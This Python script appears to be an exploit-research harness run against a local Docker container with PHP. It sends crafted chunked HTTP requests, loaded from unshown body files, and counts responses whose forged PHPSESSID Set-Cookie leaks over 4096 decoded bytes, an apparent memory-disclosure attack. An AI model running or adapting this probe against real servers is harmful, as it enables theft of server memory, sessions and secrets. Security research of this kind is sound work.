#!/usr/bin/env python3
"""Version-agnostic A1+B1 probe: no gdb, no symbols needed.

Restart -> warmup GET -> A1 (chunked, 5-query path) -> n x B1 (chunked).
Reports the A1 HTTP status and, for every B1, whether a forged Set-Cookie
leak came back (decoded length).
"""
import argparse, os, re, socket, subprocess, sys, time, urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = "/tmp/opencode/research/9bie_update_20261022T115026Z/code/repo"
QS = "/index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"


def chunked(port, path, body_file, save=""):
    cmd = [sys.executable, os.path.join(REPO, "pure", "chunked_send.py"),
           "--port", str(port), "--body-file", body_file, "--path", path,
           "--timeout", "300"]
    if save:
        cmd += ["--save-response", save]
    r = subprocess.run(cmd, capture_output=True, text=True)
    m = re.search(r"resp=(\d+) status='([^']*)'", r.stdout)
    if m:
        return int(m.group(1)), m.group(2)
    return -1, r.stdout.strip()[:80]


def decode_len(resp_file):
    try:
        data = open(resp_file, "rb").read()
    except OSError:
        return None
    i = data.find(b"Set-Cookie: PHPSESSID=")
    if i < 0:
        return None
    val = data[i + len(b"Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
    try:
        dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))
    except Exception:
        return None
    return len(dec)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--container", required=True)
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--a1", required=True)
    ap.add_argument("--b1", required=True)
    ap.add_argument("--n", type=int, default=3)
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--no-restart", action="store_true")
    args = ap.parse_args()
    os.makedirs(args.outdir, exist_ok=True)
    if not args.no_restart:
        subprocess.run(["docker", "restart", args.container], capture_output=True)
        time.sleep(1.5)
    try:
        s = socket.create_connection(("127.0.0.1", args.port), timeout=5)
        s.sendall(b"GET /index.php HTTP/1.0\r\nHost: x\r\n\r\n"); s.recv(1024); s.close()
    except OSError:
        pass
    n, st = chunked(args.port, QS, args.a1, os.path.join(args.outdir, "a1.resp"))
    print("A1 bytes=%d status=%r" % (n, st), flush=True)
    hits = 0
    for i in range(args.n):
        save = os.path.join(args.outdir, "b1_%d.resp" % i)
        n, st = chunked(args.port, "/index.php", args.b1, save)
        dl = decode_len(save)
        print("B1 i=%d bytes=%d status=%r decoded=%s" % (i, n, st, dl), flush=True)
        if dl and dl > 4096:
            hits += 1
    print("LEAKHITS %d/%d" % (hits, args.n), flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
